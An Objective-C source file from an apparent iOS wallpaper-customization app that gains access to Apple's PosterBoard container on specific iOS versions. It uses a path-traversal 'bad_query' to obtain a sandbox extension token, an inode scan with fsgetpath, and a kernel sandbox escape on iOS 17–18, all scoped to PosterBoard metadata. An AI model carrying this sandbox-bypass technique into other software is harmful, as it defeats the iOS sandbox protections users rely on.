// SPDX-License-Identifier: GPL-3.0-only
// Adapted from 3105 (YangJiii and contributors), commit
// a72617ed4c764a65d8aac1e91aca95231e72a2cb, exploit/mcm_bridge.m and bad_query.c.
// The bad_query sandbox-extension technique is by forcequitOS.
// Discovery also follows Placard/Bad-Poster's bounded fsgetpath/metadata approach.
// Modified for TendiesVN on 2026-10-16: only PosterBoard and fixed container
// metadata paths, retained extensions, normal Bundle IDs, and no process restart.
// Updated 2026-10-17: filesystem-independent fixed-root validation; automatic
// discovery only, with stale manual hints removed. The 1.3.1 discovery uses
// the own-home filesystem and scan-only descendant-to-root extraction.
// See LICENSE and THIRD_PARTY_NOTICES.md in the project root.
#import "PosterBoardBridge.h"
#import "KernelExploit/bad_query.h"
#import "KernelExploit/sandbox_escape.h"
#include "posterboard_path.h"
#include "posterboard_support.h"
#import <dlfcn.h>
#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <limits.h>
#import <objc/message.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <xpc/xpc.h>

static NSString *const PosterBoardIdentifier = @"com.apple.PosterBoard";
static NSString *const ApplicationDataRoot = @"/private/var/mobile/Containers/Data/Application";
static NSString *const MetadataName = @".com.apple.mobile_container_manager.metadata.plist";
static NSString *const CachedUUIDKey = @"TendiesVN.PosterBoardContainerUUID.v2";
static NSString *const LegacyManualUUIDKey = @"TendiesVN.PosterBoardContainerUUID.manual.v1";
static const uint64_t MaximumDiscoveryInode = 2000000;
static const NSUInteger MaximumMetadataCandidates = 4096;
static const off_t MaximumMetadataBytes = 1024 * 1024;

typedef void *(*MCMQueryCreate)(void);
typedef void (*MCMQuerySetU64)(void *, uint64_t);
typedef void (*MCMQuerySetXPC)(void *, xpc_object_t);
typedef void (*MCMQuerySetDomain)(void *, const char *);
typedef void *(*MCMQueryGetPointer)(void *);
typedef char *(*MCMCopyToken)(void *);
typedef const char *(*MCMGetString)(void *);
typedef void (*MCMQueryFree)(void *);
typedef int64_t (*SandboxConsume)(const char *);
typedef int (*SandboxRelease)(int64_t);

typedef struct {
    void *handle;
    MCMQueryCreate queryCreate;
    MCMQuerySetU64 querySetClass;
    MCMQuerySetXPC querySetIdentifiers;
    MCMQuerySetXPC querySetGroupIdentifiers;
    MCMQuerySetU64 querySetFlags;
    MCMQuerySetU64 querySetPart;
    MCMQuerySetDomain querySetPartDomain;
    MCMQueryGetPointer queryGetSingle;
    MCMQueryFree queryFree;
    MCMGetString objectGetPath;
    MCMGetString objectGetIdentifier;
    MCMCopyToken objectCopyToken;
    SandboxConsume consume;
    SandboxRelease release;
} MCMAPI;

static MCMAPI *MCMSharedAPI(void) {
    static MCMAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
        void *handle = api.handle ?: RTLD_DEFAULT;
#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(handle, symbol)
        LOAD(queryCreate, "container_query_create");
        LOAD(querySetClass, "container_query_set_class");
        LOAD(querySetIdentifiers, "container_query_set_identifiers");
        LOAD(querySetGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(querySetFlags, "container_query_operation_set_flags");
        LOAD(querySetPart, "container_query_operation_set_part");
        LOAD(querySetPartDomain, "container_query_operation_set_part_domain");
        LOAD(queryGetSingle, "container_query_get_single_result");
        LOAD(queryFree, "container_query_free");
        LOAD(objectGetPath, "container_object_get_path");
        LOAD(objectGetIdentifier, "container_object_get_identifier");
        LOAD(objectCopyToken, "container_copy_sandbox_token");
#undef LOAD
        api.consume = (SandboxConsume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.release = (SandboxRelease)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

static BOOL BadQueryAvailable(void) {
    MCMAPI *api = MCMSharedAPI();
    return api->queryCreate && api->querySetClass && api->querySetGroupIdentifiers &&
        api->querySetFlags && api->querySetPart && api->querySetPartDomain &&
        api->queryGetSingle && api->queryFree && api->objectCopyToken &&
        api->consume && api->release;
}

static BOOL SupportedSystemVersion(void) {
    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
    // Same predicate as Swift. Beta ordinals are identified by kern.osversion,
    // not by the numeric version (all these beta releases report 27.0).
    const char *build = NULL;
    char buildBuffer[256] = {0};
    size_t size = sizeof(buildBuffer);
    if (sysctlbyname("kern.osversion", buildBuffer, &size, NULL, 0) == 0 &&
        size > 0 && size <= sizeof(buildBuffer) && buildBuffer[size - 1] == '\0') {
        build = buildBuffer;
    } else {
        build = NULL;
    }
    return tendies_posterboard_backend_supports(
        (int)version.majorVersion, (int)version.minorVersion,
        (int)version.patchVersion, build
    );
}

NSString *TendiesCanonicalPosterBoardRootPath(NSString *rawPath) {
    if (![rawPath isKindOfClass:NSString.class]) return nil;
    const char *bytes = rawPath.UTF8String;
    if (!bytes) return nil;
    char canonical[TENDIES_POSTERBOARD_ROOT_BUFFER_SIZE];
    if (!tendies_canonical_posterboard_root_path(
        bytes, [rawPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
        canonical, sizeof(canonical)
    )) return nil;
    return [NSString stringWithUTF8String:canonical];
}

static NSString *CanonicalApplicationRoot(NSString *rawPath) {
    // Foundation standardizingPath can remove /private based on filesystem
    // visibility. Container boundaries must instead remain purely lexical.
    return TendiesCanonicalPosterBoardRootPath(rawPath);
}

// iOS 17–18 can leave the MCM metadata file unreadable even after the
// process-wide sandbox escape has succeeded. The generation-61 store is the
// stable on-device layout used by PosterBoard on those releases, so use this
// bounded shape check as a fallback. It is only ever evaluated after the
// candidate has been reduced to a real Application/<UUID> root; it does not
// accept arbitrary paths or grant access by itself.
static BOOL PosterBoardStoreShapeMatches(NSString *rootPath) {
    if (![CanonicalApplicationRoot(rootPath) isEqualToString:rootPath]) return NO;
    NSString *extensions = [rootPath stringByAppendingPathComponent:
        @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"];
    BOOL isDirectory = NO;
    if (![[NSFileManager defaultManager] fileExistsAtPath:extensions isDirectory:&isDirectory] ||
        !isDirectory) return NO;
    NSArray<NSString *> *knownExtensions = @[
        @"com.apple.WallpaperKit.CollectionsPoster",
        @"com.apple.Posters.CollectionsPosterApp",
        @"com.apple.PhotosUIPrivate.PhotosPosterProvider",
        @"com.apple.Posters.PhotosPosterProvider",
        @"com.apple.MercuryPoster",
        @"com.apple.Posters.MercuryPosterApp"
    ];
    for (NSString *identifier in knownExtensions) {
        NSString *descriptors = [extensions stringByAppendingPathComponent:
            [identifier stringByAppendingPathComponent:@"descriptors"]];
        BOOL descriptorDirectory = NO;
        if ([[NSFileManager defaultManager] fileExistsAtPath:descriptors
            isDirectory:&descriptorDirectory] && descriptorDirectory) {
            return YES;
        }
    }
    return NO;
}

// Scan-only: a descendant inode can reveal its fixed container root even when
// the container directory's own inode lies outside the scan interval. Never use
// this extractor for granting access or accepting a public root argument.
static NSString *CandidateApplicationRootFromKernelPath(NSString *rawPath) {
    if (![rawPath isKindOfClass:NSString.class]) return nil;
    const char *bytes = rawPath.UTF8String;
    if (!bytes) return nil;
    char canonical[TENDIES_POSTERBOARD_ROOT_BUFFER_SIZE];
    if (!tendies_posterboard_candidate_root_path(
        bytes, [rawPath lengthOfBytesUsingEncoding:NSUTF8StringEncoding],
        canonical, sizeof(canonical)
    )) return nil;
    return [NSString stringWithUTF8String:canonical];
}

static NSString *StringFromKernelPath(const char *buffer, ssize_t count, size_t capacity) {
    // fsgetpath's return count includes its terminating NUL.
    if (count <= 0 || (size_t)count > capacity || buffer[count - 1] != '\0') return nil;
    return [[NSString alloc] initWithBytes:buffer length:(NSUInteger)count - 1 encoding:NSUTF8StringEncoding];
}

// The automatic cache stores only a strict UUID, never an arbitrary path.
static NSString *CanonicalUUID(id rawValue) {
    if (![rawValue isKindOfClass:NSString.class]) return nil;
    NSString *value = [rawValue stringByTrimmingCharactersInSet:NSCharacterSet.whitespaceAndNewlineCharacterSet];
    if (value.length != 36) return nil;
    NSUUID *uuid = [[NSUUID alloc] initWithUUIDString:value];
    if (!uuid || [uuid.UUIDString caseInsensitiveCompare:value] != NSOrderedSame) return nil;
    return uuid.UUIDString;
}

static void ReleaseExtension(int64_t handle) {
    if (handle >= 0) MCMSharedAPI()->release(handle);
}

// This helper is private and has no caller-controlled paths. Its only accepted
// targets are an Application/UUID root or its one fixed MCM metadata file.
// Root grants are requested only after the metadata identifies PosterBoard.
static int64_t ConsumeScopedExtension(NSString *path, NSString **error) {
    BOOL isRoot = [CanonicalApplicationRoot(path) isEqualToString:path];
    BOOL isMetadata = [path.lastPathComponent isEqualToString:MetadataName] &&
        [CanonicalApplicationRoot(path.stringByDeletingLastPathComponent)
            isEqualToString:path.stringByDeletingLastPathComponent];
    if (!isRoot && !isMetadata) {
        if (error) *error = @"TQ00: rejected a path outside the wallpaper scope";
        return -1;
    }
    if (!BadQueryAvailable()) {
        if (error) *error = @"TQ01: required iOS access functions are unavailable";
        return -1;
    }
    MCMAPI *api = MCMSharedAPI();
    void *query = api->queryCreate();
    if (!query) {
        if (error) *error = @"TQ02: could not create the access query";
        return -1;
    }
    // Class 13 routes to containermanagerd_system. The part-domain construction
    // and operation flags are the bad_query mechanism, independent of the
    // host app's Bundle ID. This does not create a new app/container.
    api->querySetClass(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    api->querySetGroupIdentifiers(query, identifier);
    api->querySetPart(query, 3);
    NSString *part = [@"../../../../../../../.." stringByAppendingString:path];
    api->querySetPartDomain(query, part.fileSystemRepresentation);
    api->querySetFlags(query, 0x0000008000000000ULL);
    int64_t handle = -1;
    void *result = api->queryGetSingle(query);
    if (!result) {
        if (error) *error = @"TQ03: iOS denied the access query; check the iOS version";
    } else {
        char *token = api->objectCopyToken(result);
        if (!token || !token[0]) {
            if (error) *error = @"TQ04: iOS returned no sandbox extension";
        } else {
            handle = api->consume(token);
            if (handle < 0 && error) *error = @"TQ05: iOS rejected the sandbox extension";
        }
        free(token);
    }
    api->queryFree(query);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    return handle;
}

// Read only the bounded metadata file; never read another app's Documents,
// preferences, or other content while looking for PosterBoard. The extension is
// released before returning, including for every nonmatching candidate.
static BOOL MetadataIdentifiesPosterBoard(NSString *rootPath, NSString **error) {
    if (![CanonicalApplicationRoot(rootPath) isEqualToString:rootPath]) {
        if (error) *error = @"TP07: container UUID or metadata could not be verified";
        return NO;
    }
    NSString *metadataPath = [rootPath stringByAppendingPathComponent:MetadataName];
    int64_t handle = -1;
    int descriptor = open(metadataPath.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor < 0) {
        handle = ConsumeScopedExtension(metadataPath, error);
        if (handle < 0) return NO;
        descriptor = open(metadataPath.fileSystemRepresentation, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    }
    if (descriptor < 0) {
        if (error) *error = @"TP01: container metadata is unreadable; open Wallpaper settings and retry";
        ReleaseExtension(handle);
        return NO;
    }
    struct stat attributes;
    NSMutableData *data = nil;
    if (fstat(descriptor, &attributes) == 0 && S_ISREG(attributes.st_mode) &&
        attributes.st_size > 0 && attributes.st_size <= MaximumMetadataBytes) {
        data = [NSMutableData dataWithLength:(NSUInteger)attributes.st_size];
        NSUInteger offset = 0;
        while (offset < data.length) {
            ssize_t count = read(descriptor, (uint8_t *)data.mutableBytes + offset, data.length - offset);
            if (count < 0 && errno == EINTR) continue;
            if (count <= 0) { data = nil; break; }
            offset += (NSUInteger)count;
        }
    }
    close(descriptor);
    ReleaseExtension(handle);
    id metadata = data ? [NSPropertyListSerialization propertyListWithData:data
        options:NSPropertyListImmutable format:NULL error:NULL] : nil;
    if (![metadata isKindOfClass:NSDictionary.class] ||
        ![metadata[@"MCMMetadataIdentifier"] isKindOfClass:NSString.class]) {
        if (error) *error = @"TP07: container metadata is missing or invalid";
        return NO;
    }
    if (![metadata[@"MCMMetadataIdentifier"] isEqual:PosterBoardIdentifier]) {
        // Never include a nonmatching app's identity in diagnostics.
        if (error) *error = @"TP08: container metadata identifies a different app";
        return NO;
    }
    return YES;
}

// Exact, metadata-only lookup. It does not request an MHA-privileged extension.
static NSString *PosterBoardRootFromMCM(void) {
    MCMAPI *api = MCMSharedAPI();
    if (!api->queryCreate || !api->querySetClass || !api->querySetIdentifiers ||
        !api->querySetFlags || !api->queryGetSingle || !api->queryFree ||
        !api->objectGetPath || !api->objectGetIdentifier) return nil;
    void *query = api->queryCreate();
    if (!query) return nil;
    api->querySetClass(query, 2);
    xpc_object_t identifier = xpc_string_create(PosterBoardIdentifier.UTF8String);
    api->querySetIdentifiers(query, identifier);
    api->querySetFlags(query, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(query, 0);
    void *result = api->queryGetSingle(query);
    const char *rawIdentifier = result ? api->objectGetIdentifier(result) : NULL;
    const char *rawPath = result ? api->objectGetPath(result) : NULL;
    NSString *root = nil;
    if (rawIdentifier && rawPath && strcmp(rawIdentifier, PosterBoardIdentifier.UTF8String) == 0) {
        root = CanonicalApplicationRoot([NSString stringWithUTF8String:rawPath]);
    }
    api->queryFree(query);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    return root;
}

static NSString *PosterBoardRootFromLaunchServices(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        if (!NSClassFromString(@"LSApplicationProxy")) {
            // Retain the framework handle for the Objective-C classes' lifetime.
            dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY | RTLD_LOCAL);
        }
    });
    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    SEL lookup = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (!proxyClass || ![proxyClass respondsToSelector:lookup]) return nil;
    @try {
        id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, lookup, PosterBoardIdentifier);
        if (!proxy) return nil;
        for (NSString *name in @[@"dataContainerURL", @"containerURL"]) {
            SEL selector = NSSelectorFromString(name);
            if (![proxy respondsToSelector:selector]) continue;
            id value = ((id (*)(id, SEL))objc_msgSend)(proxy, selector);
            NSString *path = [value isKindOfClass:NSURL.class] ? [value path] : value;
            NSString *root = CanonicalApplicationRoot(path);
            if (root) return root;
        }
    } @catch (__unused NSException *exception) {
        // Private LaunchServices selectors vary. Fall back to fixed metadata.
    }
    return nil;
}

static NSString *DiscoverPosterBoardRoot(NSString **error) {
    NSMutableSet<NSString *> *examined = [NSMutableSet set];
    __block NSString *firstMetadataFailure = nil;
    BOOL (^matches)(NSString *) = ^BOOL(NSString *rawPath) {
        NSString *root = CanonicalApplicationRoot(rawPath);
        if (!root || [examined containsObject:root] || examined.count >= MaximumMetadataCandidates) return NO;
        [examined addObject:root];
        NSString *detail = nil;
        BOOL valid = MetadataIdentifiesPosterBoard(root, &detail);
        if (!valid && PosterBoardStoreShapeMatches(root)) {
            // On iOS 17–18 MCM may hide the identity plist after the kernel
            // escape while the generation-61 PosterBoard store remains
            // readable. The fixed store shape is the bounded legacy fallback.
            valid = YES;
        }
        if (!valid && !firstMetadataFailure) {
            firstMetadataFailure = detail ?: @"TP07: container metadata could not be verified";
        }
        return valid;
    };
    NSString *cachedUUID = CanonicalUUID([NSUserDefaults.standardUserDefaults objectForKey:CachedUUIDKey]);
    if (cachedUUID) {
        NSString *cachedRoot = [ApplicationDataRoot stringByAppendingPathComponent:cachedUUID];
        if (matches(cachedRoot)) return cachedRoot;
    }
    [NSUserDefaults.standardUserDefaults removeObjectForKey:CachedUUIDKey];
    NSString *lookupRoot = PosterBoardRootFromMCM();
    if (matches(lookupRoot)) return lookupRoot;
    // The MCM query above already requested the exact
    // com.apple.PosterBoard identifier. On iOS 17–18 its metadata plist may
    // still be hidden after the escape, so retain that canonical result even
    // when the secondary plist check cannot be read.
    if (lookupRoot && CanonicalApplicationRoot(lookupRoot)) return lookupRoot;
    lookupRoot = PosterBoardRootFromLaunchServices();
    if (matches(lookupRoot)) return lookupRoot;
    // LaunchServices was queried with the same exact bundle identifier; use
    // its canonical data-container URL when MCM metadata is unavailable.
    if (lookupRoot && CanonicalApplicationRoot(lookupRoot)) return lookupRoot;
    // On builds that allow names to be listed, avoid an inode scan. Do not
    // request a recursive extension for the Application parent directory.
    DIR *directory = opendir(ApplicationDataRoot.fileSystemRepresentation);
    if (directory) {
        struct dirent *entry;
        while ((entry = readdir(directory)) && examined.count < MaximumMetadataCandidates) {
            NSString *name = [NSString stringWithUTF8String:entry->d_name];
            if (!name.length || ![[NSUUID alloc] initWithUUIDString:name]) continue;
            NSString *root = [ApplicationDataRoot stringByAppendingPathComponent:name];
            if (matches(root)) { closedir(directory); return root; }
        }
        closedir(directory);
    }
    // Our own Application/UUID home is an accessible reference on the same
    // filesystem as the target parent. Read only our own fd metadata; never
    // request an extension for Application or another broad parent directory.
    NSString *homePath = NSHomeDirectory();
    NSString *homeRoot = CanonicalApplicationRoot(homePath);
    struct stat homeAttributes;
    struct statfs homeFileSystem;
    BOOL homeStatKnown = NO;
    BOOL homeFileSystemKnown = NO;
    if (homeRoot) {
        int homeDescriptor = open(homePath.fileSystemRepresentation,
            O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
        if (homeDescriptor >= 0) {
            homeStatKnown = fstat(homeDescriptor, &homeAttributes) == 0 && S_ISDIR(homeAttributes.st_mode);
            homeFileSystemKnown = fstatfs(homeDescriptor, &homeFileSystem) == 0;
            close(homeDescriptor);
        }
        if (!homeStatKnown) {
            homeStatKnown = lstat(homePath.fileSystemRepresentation, &homeAttributes) == 0 &&
                S_ISDIR(homeAttributes.st_mode);
        }
        if (!homeFileSystemKnown) {
            homeFileSystemKnown = statfs(homePath.fileSystemRepresentation, &homeFileSystem) == 0;
        }
    }
    struct statfs fileSystem;
    NSString *filesystemSource = @"fallback";
    if (homeFileSystemKnown) {
        fileSystem = homeFileSystem;
        filesystemSource = @"home";
    } else if (statfs(ApplicationDataRoot.fileSystemRepresentation, &fileSystem) != 0 &&
        statfs("/private/var", &fileSystem) != 0 && statfs("/var", &fileSystem) != 0) {
        if (error) *error = @"TP02: container filesystem is unavailable";
        return nil;
    }
    BOOL selectedMatchesHome = homeFileSystemKnown &&
        fileSystem.f_fsid.val[0] == homeFileSystem.f_fsid.val[0] &&
        fileSystem.f_fsid.val[1] == homeFileSystem.f_fsid.val[1];
    fsid_t filesystemID = fileSystem.f_fsid;
    uint64_t ownInode = homeStatKnown ? (uint64_t)homeAttributes.st_ino : 0;
    uint64_t pathAttempts = 0;
    uint64_t validPathReturns = 0;
    uint64_t directRootReturns = 0;
    uint64_t descendantRootReturns = 0;
    BOOL recordedPathFailure = NO;
    int firstPathErrno = 0;
    NSString *selfRoundTrip = @"unavailable";
    char buffer[PATH_MAX];
    if (homeStatKnown) {
        // This one known-inode probe is counted inside the existing 2m budget.
        pathAttempts++;
        errno = 0;
        ssize_t count = fsgetpath(buffer, sizeof(buffer), &filesystemID, ownInode);
        int callError = errno;
        NSString *returnedPath = StringFromKernelPath(buffer, count, sizeof(buffer));
        if (returnedPath) {
            validPathReturns++;
            selfRoundTrip = [CanonicalApplicationRoot(returnedPath) isEqualToString:homeRoot]
                ? @"match" : @"mismatch";
        } else {
            firstPathErrno = callError ?: EINVAL;
            recordedPathFailure = YES;
            selfRoundTrip = [NSString stringWithFormat:@"fail(%d)", firstPathErrno];
        }
    }
    // Every returned descendant is reduced to a strict root before the same
    // metadata identity check. Descendant files are never opened or granted.
    for (uint64_t inode = 1; inode <= MaximumDiscoveryInode &&
         pathAttempts < MaximumDiscoveryInode && examined.count < MaximumMetadataCandidates; inode++) {
        pathAttempts++;
        errno = 0;
        ssize_t count = fsgetpath(buffer, sizeof(buffer), &filesystemID, inode);
        int callError = errno;
        @autoreleasepool {
            NSString *returnedPath = StringFromKernelPath(buffer, count, sizeof(buffer));
            if (!returnedPath) {
                if (!recordedPathFailure) {
                    recordedPathFailure = YES;
                    firstPathErrno = callError ?: EINVAL;
                }
                continue;
            }
            validPathReturns++;
            NSString *root = CanonicalApplicationRoot(returnedPath);
            if (root) {
                directRootReturns++;
            } else {
                root = CandidateApplicationRootFromKernelPath(returnedPath);
                if (root) descendantRootReturns++;
            }
            if (root && matches(root)) return root;
        }
    }
    NSString *pathFailure = recordedPathFailure
        ? [NSString stringWithFormat:@"%d", firstPathErrno] : @"none";
    NSString *metadataCode = firstMetadataFailure
        ? [firstMetadataFailure componentsSeparatedByString:@":"].firstObject : @"none";
    if (error) *error = [NSString stringWithFormat:
        @"TP03: candidates=%lu paths=%llu/%llu roots=%llu children=%llu "
         @"fs=%@ ownfs=%d samefs=%d self=%@ inode=%llu high=%d errno=%@ meta=%@",
        (unsigned long)examined.count, (unsigned long long)validPathReturns,
        (unsigned long long)pathAttempts, (unsigned long long)directRootReturns,
        (unsigned long long)descendantRootReturns, filesystemSource,
        homeFileSystemKnown, selectedMatchesHome, selfRoundTrip,
        (unsigned long long)ownInode, ownInode > MaximumDiscoveryInode,
        pathFailure, metadataCode];
    return nil;
}

@interface TendiesPosterBoardLease : NSObject {
    int64_t _extensionHandle;
}
@property(nonatomic, copy) NSString *rootPath;
+ (nullable instancetype)leaseWithError:(NSString **)error;
+ (nullable instancetype)leaseForRoot:(NSString *)rootPath error:(NSString **)error;
- (BOOL)validate:(NSString **)error;
@end

@implementation TendiesPosterBoardLease
- (instancetype)init {
    self = [super init];
    if (self) _extensionHandle = -1;
    return self;
}
+ (instancetype)leaseWithError:(NSString **)error {
    NSString *rootPath = DiscoverPosterBoardRoot(error);
    if (!rootPath) return nil;
    TendiesPosterBoardLease *lease = [self leaseForRoot:rootPath error:error];
    if (lease) {
        [NSUserDefaults.standardUserDefaults setObject:rootPath.lastPathComponent forKey:CachedUUIDKey];
    }
    return lease;
}
+ (instancetype)leaseForRoot:(NSString *)rootPath error:(NSString **)error {
    // Check the exact identity before any root grant.
    if (!MetadataIdentifiesPosterBoard(rootPath, error)) {
        if (error && !*error) *error = @"TP07: PosterBoard metadata could not be verified";
        return nil;
    }
    int64_t handle = ConsumeScopedExtension(rootPath, error);
    if (handle < 0) return nil;
    TendiesPosterBoardLease *lease = [TendiesPosterBoardLease new];
    lease->_extensionHandle = handle;
    lease.rootPath = rootPath;
    if (![lease validate:error]) return nil;
    return lease;
}

- (BOOL)validate:(NSString **)error {
    if (_extensionHandle < 0 || !MetadataIdentifiesPosterBoard(self.rootPath, error)) {
        if (error && !*error) *error = @"TP04: PosterBoard metadata identity could not be verified";
        return NO;
    }
    int descriptor = open(self.rootPath.fileSystemRepresentation,
        O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
    if (descriptor < 0) {
        if (error) *error = [NSString stringWithFormat:@"TP05: PosterBoard root access denied (errno %d)", errno];
        return NO;
    }
    close(descriptor);
    char resolved[PATH_MAX];
    if (!realpath(self.rootPath.fileSystemRepresentation, resolved) ||
        ![self.rootPath isEqualToString:CanonicalApplicationRoot([NSString stringWithUTF8String:resolved])]) {
        if (error) *error = @"TP06: PosterBoard root contains an unexpected symbolic link";
        return NO;
    }
    return YES;
}
- (void)dealloc {
    ReleaseExtension(_extensionHandle);
}
@end

static TendiesPosterBoardLease *retainedLease;

NSString *TendiesPosterBoardContainerPath(NSString **error) {
    if (error) *error = nil;
    // Older builds exposed a manual hint. It must never block automatic
    // discovery after this update, even when its container has become stale.
    [NSUserDefaults.standardUserDefaults removeObjectForKey:LegacyManualUUIDKey];
    if (!SupportedSystemVersion()) {
        if (error) *error = @"TV01: this access method supports iOS 26.0 through 26.6.1 and the listed iOS 27.0 beta builds";
        return nil;
    }
    if (!BadQueryAvailable()) {
        if (error) *error = @"TQ01: required iOS access functions are unavailable";
        return nil;
    }
    @synchronized (TendiesPosterBoardLease.class) {
        if (retainedLease && [retainedLease validate:NULL]) return retainedLease.rootPath;
        retainedLease = nil;
        retainedLease = [TendiesPosterBoardLease leaseWithError:error];
        return retainedLease.rootPath;
    }
}

NSString *TendiesLegacyPosterBoardContainerPath(NSString **error) {
    if (error) *error = nil;
    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
    BOOL supported = version.majorVersion >= 17 && version.majorVersion < 19;
    if (!supported) {
        if (error) *error = @"TV17: legacy PosterBoard access is limited to iOS 17–18";
        return nil;
    }
    // The caller activates the 3105 kernel primitive before entering this
    // resolver. The same metadata-only discovery and retained, scoped lease
    // used by the newer BadQuery route can then locate the UUID automatically.
    @synchronized (TendiesPosterBoardLease.class) {
        // On iOS 17–18 the kernel chain supplies a process-wide sandbox
        // escape, while the newer BadQuery sandbox-extension query may not
        // exist or may be denied. In that state a validated root is already
        // accessible; do not require the iOS 26/27 extension API just to
        // discover its UUID.
        if (sandbox_access_is_active() == 1) {
            NSString *root = DiscoverPosterBoardRoot(error);
            if (root) return root;
        }
        if (retainedLease && [retainedLease validate:NULL]) return retainedLease.rootPath;
        retainedLease = nil;
        retainedLease = [TendiesPosterBoardLease leaseWithError:error];
        return retainedLease.rootPath;
    }
}
